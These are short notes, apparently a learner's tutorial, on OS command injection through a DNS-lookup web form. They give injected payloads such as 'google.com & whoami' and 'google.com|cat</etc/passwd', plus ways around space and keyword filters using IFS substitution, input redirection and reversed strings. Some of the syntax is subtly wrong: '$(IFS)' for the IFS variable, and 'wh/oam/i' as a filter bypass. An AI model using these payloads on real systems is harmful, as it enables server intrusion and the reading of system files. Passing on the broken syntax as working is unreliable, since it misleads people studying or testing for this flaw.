OS Command Injection

- For example, if the outputs on a site that performs DNS analysis are similar to nslookup on the Linux command line, we can try other commands here and look at the outputs.
- example:
If the site contains dns as google.com, we can enter the google.com & whoami command.


- If the website thinks about the characters we will enter in advance, it can prevent this.
- For example, it may block the space character.
If it blocks the space character:
- google.com & cat /etc/passwd -> gives error.
- (; can be used instead of &.)
- google.com|cat</etc/passwd -> may work.
("<" can be used instead of the space character.)
- google.com|cat$(IFS)/etc/passwd -> may work.
- $(IFS) can be used in place of the space character.

Sometimes the web server may have banned the word:
- example if the whoami command is prohibited
command by saying google.com & wh/oam/i
we can run it.

- echo imaohw|rev: prints whoami, can be used for banned words. If we make the output of the first command input to the second command, it will run the whoami command.
